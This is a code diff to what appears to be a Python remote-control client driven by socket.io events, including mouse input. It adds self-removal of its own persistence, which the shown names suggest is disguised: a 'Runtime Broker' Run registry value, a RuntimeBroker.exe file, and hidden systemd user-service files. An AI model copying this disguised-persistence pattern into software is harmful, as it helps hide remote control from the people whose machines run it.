@@ -230,6 +230,22 @@ def run(data):
                 PGID = os.getpgid(PID)
                 os.killpg(PGID, signal.SIGKILL)
 
+    def remove_registry_key(key_name):
+        try:
+            import winreg
+
+            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
+            
+            try:
+                winreg.DeleteValue(reg_key, key_name)
+                print(f"Registry key '{key_name}' has been removed successfully.")
+            except FileNotFoundError:
+                print(f"Registry key '{key_name}' not found.")
+            finally:
+                winreg.CloseKey(reg_key)
+        except Exception as e:
+            print(f"Error: {e}")
+
     @sio.on("delete")
     def delete(data_new):
         if data["uid"] == data_new["uid"]:
@@ -240,6 +256,7 @@ def run(data):
                     os.remove(path+"uid.txt")
                 if os.path.exists(path+"RuntimeBroker.exe"):
                     os.remove(path+"RuntimeBroker.exe")
+                remove_registry_key("Runtime Broker")
             else:
                 path=f"/home/{user}/.config/systemd/user/"
                 if os.path.exists(path+".system_uid"):
@@ -248,6 +265,11 @@ def run(data):
                     os.remove(path+".systemd")
                 if os.path.exists(path+"systemd.service"):
                     os.remove(path+"systemd.service")
+
+                subprocess.run(
+                    "XDG_RUNTIME_DIR=/run/user/$UID systemctl --user disable systemd.service",
+                    shell=True,
+                )
         kill(data_new)
 
     @sio.on("mouse_input")
